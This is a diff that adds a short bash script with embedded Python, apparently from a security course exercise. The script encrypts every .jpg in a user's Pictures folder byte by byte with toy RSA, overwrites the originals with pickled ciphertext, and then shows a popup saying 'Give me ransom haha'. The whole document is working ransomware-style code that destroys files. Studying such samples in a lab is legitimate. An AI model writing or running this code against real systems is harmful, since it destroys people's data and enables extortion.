@@ -1,0 +1,25 @@
+#!/usr/bin/env bash
+
+python3 <<EOF
+from os import listdir
+import pickle
+
+n = 22291846172619859445381409012451
+e = 65535
+d = 14499309299673345844676003563183
+
+for file in listdir('/home/csc2023/Pictures/'):
+    if not file.endswith('.jpg'):
+        break
+    # encrypt
+    plain_bytes = b''
+    with open(f'/home/csc2023/Pictures/{file}', 'rb') as f:
+        plain_bytes = f.read()
+    cipher = [pow(i, e, n) for i in plain_bytes]
+    with open(f'/home/csc2023/Pictures/{file}', 'wb') as f:
+        pickle.dump(cipher, f)
+EOF
+
+zenity --warning --text="Give me ransom haha"
+
+exit
